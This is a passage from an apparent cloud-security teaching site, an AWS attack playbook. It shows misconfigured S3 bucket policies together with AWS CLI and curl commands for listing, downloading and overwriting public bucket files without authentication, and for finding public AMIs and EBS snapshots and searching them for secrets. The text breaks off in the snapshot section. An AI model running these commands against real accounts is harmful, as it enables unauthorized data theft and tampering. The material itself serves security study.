class=md-ellipsis> Modify GuardDuty Configuration </span> </a> </li> <li class=md-nav__item> <a href=../../../avoiding-detection/steal-keys-undetected/ class=md-nav__link> <span class=md-ellipsis> Bypass Credential Exfiltration Detection </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_2_5> <label class=md-nav__link for=__nav_2_5 id=__nav_2_5_label tabindex=0> <span class=md-ellipsis> Post Exploitation </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_2_5_label aria-expanded=false> <label class=md-nav__title for=__nav_2_5> <span class="md-nav__icon md-icon"></span> Post Exploitation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../post_exploitation/create_a_console_session_from_iam_credentials/ class=md-nav__link> <span class=md-ellipsis> Create a Console Session from IAM Credentials </span> </a> </li> <li class=md-nav__item> <a href=../../../post_exploitation/download_tools_and_exfiltrate_data_with_aws_cli/ class=md-nav__link> <span class=md-ellipsis> Download Tools and Exfiltrate Data with the AWS CLI </span> </a> </li> <li class=md-nav__item> <a href=../../../post_exploitation/get_iam_creds_from_console_session/ class=md-nav__link> <span class=md-ellipsis> Get IAM Credentials from a Console Session </span> </a> </li> <li class=md-nav__item> <a href=../../../post_exploitation/iam_persistence/ class=md-nav__link> <span class=md-ellipsis> AWS IAM Persistence Methods </span> </a> </li> <li class=md-nav__item> <a href=../../../post_exploitation/intercept_ssm_communications/ class=md-nav__link> <span class=md-ellipsis> Intercept SSM Communications </span> </a> </li> <li class=md-nav__item> <a href=../../../post_exploitation/lambda_persistence/ class=md-nav__link> <span class=md-ellipsis> Lambda Persistence </span> </a> </li> <li class=md-nav__item> <a href=../../../post_exploitation/role-chain-juggling/ class=md-nav__link> <span class=md-ellipsis> Role Chain Juggling </span> </a> </li> <li class=md-nav__item> <a href=../../../post_exploitation/run_shell_commands_on_ec2/ class=md-nav__link> <span class=md-ellipsis> Run Shell Commands on EC2 with Send Command or Session Manager </span> </a> </li> <li class=md-nav__item> <a href=../../../post_exploitation/s3_acl_persistence/ class=md-nav__link> <span class=md-ellipsis> S3 File ACL Persistence </span> </a> </li> <li class=md-nav__item> <a href=../../../post_exploitation/survive_access_key_deletion_with_sts_getfederationtoken/ class=md-nav__link> <span class=md-ellipsis> Survive Access Key Deletion with sts:GetFederationToken </span> </a> </li> <li class=md-nav__item> <a href=../../../post_exploitation/user_data_script_persistence/ class=md-nav__link> <span class=md-ellipsis> User Data Script Persistence </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_2_6> <label class=md-nav__link for=__nav_2_6 id=__nav_2_6_label tabindex=0> <span class=md-ellipsis> Deprecated </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_2_6_label aria-expanded=false> <label class=md-nav__title for=__nav_2_6> <span class="md-nav__icon md-icon"></span> Deprecated </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../deprecated/stealth_perm_enum/ class=md-nav__link> <span class=md-ellipsis> [Deprecated] Enumerate Permissions without Logging to CloudTrail </span> </a> </li> <li class=md-nav__item> <a href=../../../deprecated/whoami/ class=md-nav__link> <span class=md-ellipsis> [Deprecated] Whoami - Get Principal Name From Keys </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_2_7> <label class=md-nav__link for=__nav_2_7 id=__nav_2_7_label tabindex=0> <span class=md-ellipsis> Capture the Flag </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_2_7_label aria-expanded=false> <label class=md-nav__title for=__nav_2_7> <span class="md-nav__icon md-icon"></span> Capture the Flag </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../capture_the_flag/cicdont/ class=md-nav__link> <span class=md-ellipsis> CI/CDon't </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_3> <label class=md-nav__link for=__nav_3 id=__nav_3_label tabindex=0> <span class=md-ellipsis> Azure </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_3_label aria-expanded=false> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> Azure </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../azure/abusing-managed-identities/ class=md-nav__link> <span class=md-ellipsis> Abusing Managed Identities </span> </a> </li> <li class=md-nav__item> <a href=../../../../azure/anonymous-blob-access/ class=md-nav__link> <span class=md-ellipsis> Anonymous Blob Access </span> </a> </li> <li class=md-nav__item> <a href=../../../../azure/enum_email_addresses/ class=md-nav__link> <span class=md-ellipsis> Unauthenticated Enumeration of Azure Active Directory Email Addresses </span> </a> </li> <li class=md-nav__item> <a href=../../../../azure/run-command-abuse/ class=md-nav__link> <span class=md-ellipsis> Run Command Abuse </span> </a> </li> <li class=md-nav__item> <a href=../../../../azure/soft-deleted-blobs/ class=md-nav__link> <span class=md-ellipsis> Soft Deleted Blobs </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_4> <label class=md-nav__link for=__nav_4 id=__nav_4_label tabindex=0> <span class=md-ellipsis> GCP </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_4_label aria-expanded=false> <label class=md-nav__title for=__nav_4> <span class="md-nav__icon md-icon"></span> GCP </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_4_1> <label class=md-nav__link for=__nav_4_1 id=__nav_4_1_label tabindex=0> <span class=md-ellipsis> General Knowledge </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_4_1_label aria-expanded=false> <label class=md-nav__title for=__nav_4_1> <span class="md-nav__icon md-icon"></span> General Knowledge </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../gcp/general-knowledge/default-account-names/ class=md-nav__link> <span class=md-ellipsis> Default Account Information </span> </a> </li> <li class=md-nav__item> <a href=../../../../gcp/general-knowledge/gcp-buckets/ class=md-nav__link> <span class=md-ellipsis> Hunting GCP Buckets </span> </a> </li> <li class=md-nav__item> <a href=../../../../gcp/general-knowledge/metadata_in_google_cloud_instances/ class=md-nav__link> <span class=md-ellipsis> Metadata in Google Cloud Instances </span> </a> </li> <li class=md-nav__item> <a href=../../../../gcp/general-knowledge/security-and-constraints/ class=md-nav__link> <span class=md-ellipsis> Security and Constraints </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_4_2> <label class=md-nav__link for=__nav_4_2 id=__nav_4_2_label tabindex=0> <span class=md-ellipsis> Enumeration </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_4_2_label aria-expanded=false> <label class=md-nav__title for=__nav_4_2> <span class="md-nav__icon md-icon"></span> Enumeration </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../gcp/enumeration/enum_email_addresses/ class=md-nav__link> <span class=md-ellipsis> Unauthenticated Enumeration of Google Workspace Email Addresses </span> </a> </li> <li class=md-nav__item> <a href=../../../../gcp/enumeration/enumerate_all_permissions/ class=md-nav__link> <span class=md-ellipsis> Enumerate Org/Folder/Project Permissions + Individual Resource Permissions </span> </a> </li> <li class=md-nav__item> <a href=../../../../gcp/enumeration/enumerate_service_account_permissions/ class=md-nav__link> <span class=md-ellipsis> Enumerate Service Account Permissions </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_4_3> <label class=md-nav__link for=__nav_4_3 id=__nav_4_3_label tabindex=0> <span class=md-ellipsis> Exploitation </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_4_3_label aria-expanded=false> <label class=md-nav__title for=__nav_4_3> <span class="md-nav__icon md-icon"></span> Exploitation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../gcp/exploitation/gcp_iam_privilege_escalation/ class=md-nav__link> <span class=md-ellipsis> Privilege Escalation in Google Cloud Platform </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_4_4> <label class=md-nav__link for=__nav_4_4 id=__nav_4_4_label tabindex=0> <span class=md-ellipsis> Capture the Flag </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_4_4_label aria-expanded=false> <label class=md-nav__title for=__nav_4_4> <span class="md-nav__icon md-icon"></span> Capture the Flag </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../gcp/capture_the_flag/gcp-goat/ class=md-nav__link> <span class=md-ellipsis> GCP Goat </span> </a> </li> <li class=md-nav__item> <a href=../../../../gcp/capture_the_flag/thunder_ctf/ class=md-nav__link> <span class=md-ellipsis> Thunder CTF </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_5> <label class=md-nav__link for=__nav_5 id=__nav_5_label tabindex=0> <span class=md-ellipsis> Terraform </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_5_label aria-expanded=false> <label class=md-nav__title for=__nav_5> <span class="md-nav__icon md-icon"></span> Terraform </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../terraform/terraform_ansi_escape_evasion/ class=md-nav__link> <span class=md-ellipsis> Terraform ANSI Escape </span> </a> </li> <li class=md-nav__item> <a href=../../../../terraform/terraform_enterprise_metadata_service/ class=md-nav__link> <span class=md-ellipsis> Terraform Enterprise: Attack the Metadata Service </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_6> <label class=md-nav__link for=__nav_6 id=__nav_6_label tabindex=0> <span class=md-ellipsis> Blog </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_6_label aria-expanded=false> <label class=md-nav__title for=__nav_6> <span class="md-nav__icon md-icon"></span> Blog </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../blog/2023_wrap-up/ class=md-nav__link> <span class=md-ellipsis> 2023 Wrap-up </span> </a> </li> <li class=md-nav__item> <a href=../../../../blog/2022_wrap-up/ class=md-nav__link> <span class=md-ellipsis> 2022 Wrap-up </span> </a> </li> <li class=md-nav__item> <a href=../../../../blog/v2_new_look/ class=md-nav__link> <span class=md-ellipsis> Hacking The Cloud v2: New Look </span> </a> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#1-can-be-found-from-black-box-perspective class=md-nav__link> <span class=md-ellipsis> 1. Can be found from black-box perspective </span> </a> <nav class=md-nav aria-label="1. Can be found from black-box perspective"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#s3-buckets class=md-nav__link> <span class=md-ellipsis> S3 Buckets </span> </a> <nav class=md-nav aria-label="S3 Buckets"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#public-list-read-and-write class=md-nav__link> <span class=md-ellipsis> Public List, Read and Write </span> </a> </li> <li class=md-nav__item> <a href=#authenticated-list-and-write class=md-nav__link> <span class=md-ellipsis> Authenticated List and Write </span> </a> </li> <li class=md-nav__item> <a href=#s3-static-website-list-unauthenticated class=md-nav__link> <span class=md-ellipsis> S3 Static Website List Unauthenticated </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#amis class=md-nav__link> <span class=md-ellipsis> AMIs </span> </a> </li> <li class=md-nav__item> <a href=#ebs-snapshots class=md-nav__link> <span class=md-ellipsis> EBS Snapshots </span> </a> </li> <li class=md-nav__item> <a href=#rds-snapshots class=md-nav__link> <span class=md-ellipsis> RDS Snapshots </span> </a> </li> <li class=md-nav__item> <a href=#iam-roles class=md-nav__link> <span class=md-ellipsis> IAM Roles </span> </a> </li> <li class=md-nav__item> <a href=#ssm-documents class=md-nav__link> <span class=md-ellipsis> SSM Documents </span> </a> </li> <li class=md-nav__item> <a href=#cloudfront class=md-nav__link> <span class=md-ellipsis> CloudFront </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2-cant-be-found-from-a-black-box-perspective class=md-nav__link> <span class=md-ellipsis> 2. Can't be found from a black-box perspective </span> </a> <nav class=md-nav aria-label="2. Can't be found from a black-box perspective"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#sns-topics class=md-nav__link> <span class=md-ellipsis> SNS Topics </span> </a> </li> <li class=md-nav__item> <a href=#sqs-queues class=md-nav__link> <span class=md-ellipsis> SQS Queues </span> </a> </li> <li class=md-nav__item> <a href=#private-api-gateways class=md-nav__link> <span class=md-ellipsis> Private API Gateways </span> </a> </li> <li class=md-nav__item> <a href=#lambda-functions class=md-nav__link> <span class=md-ellipsis> Lambda Functions </span> </a> </li> <li class=md-nav__item> <a href=#ecr-repositories class=md-nav__link> <span class=md-ellipsis> ECR Repositories </span> </a> <nav class=md-nav aria-label="ECR Repositories"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#private-repository-access class=md-nav__link> <span class=md-ellipsis> Private Repository Access </span> </a> </li> <li class=md-nav__item> <a href=#public-repository-access class=md-nav__link> <span class=md-ellipsis> Public Repository Access </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#call-for-contributions class=md-nav__link> <span class=md-ellipsis> Call for contributions </span> </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <p>Article by Eduard Agavriloae</p> <a href=https://github.com/Hacking-the-Cloud/hackingthe.cloud/edit/main/content/aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook.md title="Edit this page" class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4zm10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1z"/></svg> </a> <h1 id=exploiting-public-aws-resources-cli-attack-playbook>Exploiting Public AWS Resources - CLI Attack Playbook<a class=headerlink href=#exploiting-public-aws-resources-cli-attack-playbook title="Permanent link">&para;</a></h1> <div class="grid cards"> <ul> <li> <p><span class="twemoji lg middle"><svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="m21.71 20.29-1.42 1.42a1 1 0 0 1-1.41 0L7 9.85A3.8 3.8 0 0 1 6 10a4 4 0 0 1-3.78-5.3l2.54 2.54.53-.53 1.42-1.42.53-.53L4.7 2.22A4 4 0 0 1 10 6a3.8 3.8 0 0 1-.15 1l11.86 11.88a1 1 0 0 1 0 1.41M2.29 18.88a1 1 0 0 0 0 1.41l1.42 1.42a1 1 0 0 0 1.41 0l5.47-5.46-2.83-2.83M20 2l-4 2v2l-2.17 2.17 2 2L18 8h2l2-4Z"/></svg></span> <strong>Tools mentioned in this article</strong></p> <hr> <p><a href=https://github.com/saw-your-packet/CloudShovel>CloudShovel</a>: A tool for scanning public or private AMIs for sensitive files and secrets</p> <p><a href=https://github.com/awslabs/coldsnap>coldsnap</a>: A command line interface for Amazon EBS snapshots</p> </li> </ul> </div> <p>This playbook shows how to exploit AWS resources that can be misconfigured to be publicly accessible. Think of it as a glossary of quick exploitation techniques that can be performed programmatically. </p> <p>All attacks are meant to be executed from an external environment where the attacker is ideally an administrator. </p> <p>The document is split in two categories: 1. Services and resources that can be found from a black-box perspective with little to reasonable effort 2. Services and resources that require information that can't be obtained through enumeration or brute-force</p> <h2 id=1-can-be-found-from-black-box-perspective>1. Can be found from black-box perspective<a class=headerlink href=#1-can-be-found-from-black-box-perspective title="Permanent link">&para;</a></h2> <p>These services might be found from <a href=https://awseye.com/ >Awseye</a>, Google Dorking, enumeration, searchable via AWS account ID and other sane methods.</p> <h3 id=s3-buckets>S3 Buckets<a class=headerlink href=#s3-buckets title="Permanent link">&para;</a></h3> <h4 id=public-list-read-and-write>Public List, Read and Write<a class=headerlink href=#public-list-read-and-write title="Permanent link">&para;</a></h4> <p>Misconfiguration:</p> <div class=highlight><pre><span></span><code><span class=p>{</span>
<span class=w>    </span><span class=nt>&quot;Version&quot;</span><span class=p>:</span><span class=w> </span><span class=s2>&quot;2012-10-17&quot;</span><span class=p>,</span>
<span class=w>    </span><span class=nt>&quot;Statement&quot;</span><span class=p>:</span><span class=w> </span><span class=p>[</span>
<span class=w>        </span><span class=p>{</span>
<span class=w>            </span><span class=nt>&quot;Sid&quot;</span><span class=p>:</span><span class=w> </span><span class=s2>&quot;PublicReadWrite&quot;</span><span class=p>,</span>
<span class=w>            </span><span class=nt>&quot;Effect&quot;</span><span class=p>:</span><span class=w> </span><span class=s2>&quot;Allow&quot;</span><span class=p>,</span>
<span class=w>            </span><span class=nt>&quot;Principal&quot;</span><span class=p>:</span><span class=w> </span><span class=s2>&quot;*&quot;</span><span class=p>,</span>
<span class=w>            </span><span class=nt>&quot;Action&quot;</span><span class=p>:</span><span class=w> </span><span class=p>[</span>
<span class=w>                </span><span class=s2>&quot;s3:ListBucket&quot;</span><span class=p>,</span>
<span class=w>                </span><span class=s2>&quot;s3:GetObject&quot;</span><span class=p>,</span>
<span class=w>                </span><span class=s2>&quot;s3:PutObject&quot;</span>
<span class=w>            </span><span class=p>],</span>
<span class=w>            </span><span class=nt>&quot;Resource&quot;</span><span class=p>:</span><span class=w> </span><span class=p>[</span>
<span class=w>                </span><span class=s2>&quot;arn:aws:s3:::example-bucket&quot;</span><span class=p>,</span>
<span class=w>                </span><span class=s2>&quot;arn:aws:s3:::example-bucket/*&quot;</span>
<span class=w>            </span><span class=p>]</span>
<span class=w>        </span><span class=p>}</span>
<span class=w>    </span><span class=p>]</span>
<span class=p>}</span>
</code></pre></div> <div class=highlight><pre><span></span><code><span class=nv>bucket_name</span><span class=o>=</span><span class=s2>&quot;example-bucket&quot;</span>
<span class=nv>region</span><span class=o>=</span><span class=s2>&quot;region&quot;</span>

<span class=c1># List bucket contents via HTTP</span>
curl<span class=w> </span>https://<span class=nv>$bucket_name</span>.s3.<span class=nv>$region</span>.amazonaws.com/

<span class=c1># List bucket contents via CLI unauthenticated</span>
<span class=c1># --no-sign-request will perform the API call unauthenticated</span>
aws<span class=w> </span>--no-sign-request<span class=w> </span>s3<span class=w> </span>ls<span class=w> </span>s3://<span class=nv>$bucket_name</span>

<span class=c1># List all objects including in subfolders unauthenticated</span>
aws<span class=w> </span>--no-sign-request<span class=w> </span>s3api<span class=w> </span>list-objects-v2<span class=w> </span>--bucket<span class=w> </span><span class=nv>$bucket_name</span>

<span class=nv>file_name</span><span class=o>=</span><span class=s2>&quot;target-file&quot;</span>

<span class=c1># Download file from bucket unauthenticated</span>
aws<span class=w> </span>--no-sign-request<span class=w> </span>s3<span class=w> </span>cp<span class=w> </span>s3://<span class=nv>$bucket</span>/<span class=nv>$file_name</span><span class=w> </span>.

<span class=c1># Upload file unauthenticated</span>
<span class=c1># Files with same name are overwritten</span>
<span class=nb>echo</span><span class=w> </span><span class=s2>&quot;hackingthe.cloud&quot;</span><span class=w> </span>&gt;<span class=w> </span><span class=nv>$file_name</span>.new
aws<span class=w> </span>--no-sign-request<span class=w> </span>s3<span class=w> </span>cp<span class=w> </span><span class=nv>$file_name</span>.new<span class=w> </span>s3://<span class=nv>$bucket</span>/
</code></pre></div> <h4 id=authenticated-list-and-write>Authenticated List and Write<a class=headerlink href=#authenticated-list-and-write title="Permanent link">&para;</a></h4> <p>Misconfiguration: - ACL misconfigured at object level so that only authenticated identities can access the file</p> <div class=highlight><pre><span></span><code><span class=nv>bucket_name</span><span class=o>=</span><span class=s2>&quot;example-bucket&quot;</span>
<span class=nv>region</span><span class=o>=</span><span class=s2>&quot;region&quot;</span>

<span class=c1># This will not work anymore</span>
curl<span class=w> </span>https://<span class=nv>$bucket_name</span>.s3.<span class=nv>$region</span>.amazonaws.com/

<span class=c1># List bucket contents via authenticated CLI</span>
aws<span class=w> </span>s3<span class=w> </span>ls<span class=w> </span>s3://<span class=nv>$bucket_name</span>
</code></pre></div> <h4 id=s3-static-website-list-unauthenticated>S3 Static Website List Unauthenticated<a class=headerlink href=#s3-static-website-list-unauthenticated title="Permanent link">&para;</a></h4> <p>Misconfiguration: - Static website allowing bucket to be listed</p> <div class=highlight><pre><span></span><code><span class=p>{</span>
<span class=w>    </span><span class=nt>&quot;Version&quot;</span><span class=p>:</span><span class=w> </span><span class=s2>&quot;2012-10-17&quot;</span><span class=p>,</span>
<span class=w>    </span><span class=nt>&quot;Statement&quot;</span><span class=p>:</span><span class=w> </span><span class=p>[</span>
<span class=w>        </span><span class=p>{</span>
<span class=w>            </span><span class=nt>&quot;Sid&quot;</span><span class=p>:</span><span class=w> </span><span class=s2>&quot;PublicReadGetIndex&quot;</span><span class=p>,</span>
<span class=w>            </span><span class=nt>&quot;Effect&quot;</span><span class=p>:</span><span class=w> </span><span class=s2>&quot;Allow&quot;</span><span class=p>,</span>
<span class=w>            </span><span class=nt>&quot;Principal&quot;</span><span class=p>:</span><span class=w> </span><span class=p>{</span>
<span class=w>                </span><span class=nt>&quot;AWS&quot;</span><span class=p>:</span><span class=w> </span><span class=s2>&quot;*&quot;</span>
<span class=w>            </span><span class=p>},</span>
<span class=w>            </span><span class=nt>&quot;Action&quot;</span><span class=p>:</span><span class=w> </span><span class=p>[</span>
<span class=w>                </span><span class=s2>&quot;s3:ListBucket&quot;</span><span class=p>,</span>
<span class=w>                </span><span class=s2>&quot;s3:GetObject&quot;</span>
<span class=w>            </span><span class=p>],</span>
<span class=w>            </span><span class=nt>&quot;Resource&quot;</span><span class=p>:</span><span class=w> </span><span class=p>[</span>
<span class=w>                </span><span class=s2>&quot;arn:aws:s3:::example-bucket&quot;</span><span class=p>,</span>
<span class=w>                </span><span class=s2>&quot;arn:aws:s3:::example-bucket/*&quot;</span>
<span class=w>            </span><span class=p>]</span>
<span class=w>        </span><span class=p>}</span>
<span class=w>    </span><span class=p>]</span>
<span class=p>}</span>
</code></pre></div> <div class=highlight><pre><span></span><code><span class=nv>bucket_name</span><span class=o>=</span><span class=s2>&quot;example-bucket&quot;</span>
<span class=nv>region</span><span class=o>=</span><span class=s2>&quot;region&quot;</span>

<span class=c1># This will return the index.html</span>
curl<span class=w> </span>https://<span class=nv>$bucket_name</span>.s3-website.<span class=nv>$region</span>.amazonaws.com

<span class=c1># Removing the &#39;-website&#39; from the URL will list the files</span>
<span class=c1># This works because the bucket is misconfigured</span>
curl<span class=w> </span>https://<span class=nv>$bucket_name</span>.s3.<span class=nv>$region</span>.amazonaws.com

<span class=c1># List bucket contents via CLI authenticated or unauthenticated</span>
aws<span class=w> </span>s3<span class=w> </span>ls<span class=w> </span>s3://<span class=nv>$bucket_name</span>
</code></pre></div> <h3 id=amis>AMIs<a class=headerlink href=#amis title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code><span class=c1># Find the target AMI</span>
<span class=c1># Mention &#39;--include-deprecated&#39; to make sure you get all results</span>
<span class=c1># You&#39;ll have to search across every region since AMI is region dependent</span>

<span class=c1># Search by owner account</span>
aws<span class=w> </span>--region<span class=w> </span><span class=nv>$region</span><span class=w> </span>ec2<span class=w> </span>describe-images<span class=w> </span>--owner<span class=w> </span><span class=m>123456789012</span><span class=w> </span>--include-deprecated

<span class=c1># Search by description or title</span>
aws<span class=w> </span>ec2<span class=w> </span>describe-images<span class=w> </span>--filter<span class=w> </span><span class=nv>Name</span><span class=o>=</span><span class=s2>&quot;description&quot;</span>,Values<span class=o>=</span><span class=s2>&quot;*hackingthe.cloud*&quot;</span><span class=w> </span>--include-deprecated
aws<span class=w> </span>ec2<span class=w> </span>describe-images<span class=w> </span>--filter<span class=w> </span><span class=nv>Name</span><span class=o>=</span><span class=s2>&quot;name&quot;</span>,Values<span class=o>=</span><span class=s2>&quot;*hackingthe.cloud*&quot;</span><span class=w> </span>--include-deprecated

<span class=c1># Automatically scan the AMI with cloudshovel</span>
<span class=c1># --bucket will specify where to save the files</span>
<span class=c1># This will not work if multiple cloudshovel is executed</span>
<span class=c1># multiple times in the same environment</span>
cloudshovel<span class=w> </span>--region<span class=w> </span><span class=nv>$region</span><span class=w> </span>--bucket<span class=w> </span>example-bucket<span class=w> </span>ami-example1234567890

<span class=c1># Manual approach</span>
<span class=c1># Start an EC2 instance based on the target AMI and save</span>
<span class=c1># the instance ID returned</span>
<span class=c1># Create a security group that allows all inbound traffic if</span>
<span class=c1># you don&#39;t already have one and use it here</span>
<span class=c1># If the command fails then you might have to use another instance-type like c5.large</span>
<span class=c1># You can specify &#39;--no-associate-public-ip-address&#39; if you don&#39;t want the instance</span>
<span class=c1># to have a public IP, but you&#39;ll need a VPC Endpoint to connect to it via</span>
<span class=c1># ec2-isntance-connect</span>
aws<span class=w> </span>ec2<span class=w> </span>run-instances<span class=w> </span>--security-group-ids<span class=w> </span>sg-example1234567890<span class=w> </span>--instance-type<span class=w> </span>t2.micro<span class=w> </span>--image-id<span class=w> </span>ami-example1234567890<span class=w> </span>

<span class=c1># Try to connect to it using EC2 Instance Connect. The instance</span>
aws<span class=w> </span>ec2-instance-connect<span class=w> </span>ssh<span class=w> </span>--os-user<span class=w> </span>root<span class=w> </span>--instance-id<span class=w> </span>i-example1234567890
<span class=c1># Search for files and secrets once connected</span>
<span class=c1># If the command fails then most likely you&#39;ll have to </span>
<span class=c1># use the different method to access the AMI</span>
<span class=c1># 1. You can use cloudshovel</span>
<span class=c1># 2. Make an EBS Snapshot of the volume(s) and download them with coldsnap</span>

<span class=c1># When you&#39;re done you can terminate the instance</span>
aws<span class=w> </span>ec2<span class=w> </span>terminate-instances<span class=w> </span>--instance-ids<span class=w> </span><span class=nv>$instance_id</span>
</code></pre></div> <h3 id=ebs-snapshots>EBS Snapshots<a class=headerlink href=#ebs-snapshots title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code><span class=nv>region</span><span class=o>=</span>region

<span class=c1># Search by AWS account ID</span>
aws<span class=w> </span>ec2<span class=w> </span>describe-snapshots<span class=w> </span>--owner-ids<span class=w> </span><span class=m>123456789012</span>

<span class=c1># Search by description</span>
aws<span class=w> </span>ec2<span class=w> </span>describe-snapshots<span class=w> </span>--filter<span class=w> </span><span class=s2>&quot;Name=description,Values=*hackingthe.cloud*&quot;</span>

<span class=c1># Create volume from snapshot</span>
<span class=c1># The availability zone must be the same as the instance we </span>
<span class=c1># will create shortly in order to attach the new volume there</span>
aws<span class=w> </span>ec2<span class=w> </span>create-volume<span class=w> </span>--availability-zone<span class=w> </span><span class=nv>$region</span><span class=s1>&#39;a&#39;</span><span class=w> </span>--snapshot-id<span class=w> </span>snap-example1234567890

<span class=c1># Alternatively you can try to copy the Snapshot and</span>
<span class=c1># operate with ti from there</span>
<span class=c1># aws ec2 copy-snapshot --source-snapshot-id snap-example1234567890 --source-region $region</span>

<span class=c1># Check if status is &#39;ok&#39;</span>
<span class=c1># Volume id is from the &#39;create-volume&#39; API call</span>
aws<span class=w> </span>ec2<span class=w> </span>describe-volume-status<span class=w> </span>--volume-id<span class=w> </span><span class=nv>$volume_id</span>

<span class=c1># Start a new EC2 instance in the same Availability Zone</span>
<span class=c1># The Image Id is for an Amazon Linux image and has</span>
<span class=c1># nothing to do with the public AMI from the previous section</span>
<span class=c1># Create a security group that allows all inbound traffic if</span>
<span class=c1># you don&#39;t already have one and use it here</span>
aws<span class=w> </span>ec2<span class=w> </span>run-instances<span class=w> </span>--security-group-ids<span class=w> </span>sg-example1234567890<span class=w> </span>--instance-type<span class=w> </span>t2.micro<span class=w> </span>--placement<span class=w> </span><span class=nv>AvailabilityZone</span><span class=o>=</span><span class=nv>$region</span><span class=s1>&#39;a&#39;</span><span class=w> </span>--image-id<span class=w> </span>ami-example1234567890

<span class=c1># Attach volume to your instance and specify as device</span>
<span class=c1># anything from /dev/sdf to /dev/sdp (you can use /dev/sdf)</span>
<span class=c1># --instance-id is from &#39;run-instances&#39; API call</span>
aws<span class=w> </span>ec2<span class=w> </span>attach-volume<span class=w> </span>--volume-id<span class=w> </span><span class=nv>$volume_id</span><span class=w> </span>--instance-id<span class=w> </span><span class=nv>$instance_id</span><span class=w> </span>--device<span class=w> </span>/dev/sdf

<span class=c1># Connect to the instance</span>
aws<span class=w> </span>ec2-instance-connect<span class=w> </span>ssh<span class=w> </span>--os-user<span class=w> </span>root<span class=w> </span>--instance-id<span class=w> </span><span class=nv>$instance_id</span>
<span class=c1># Mount the volume</span>
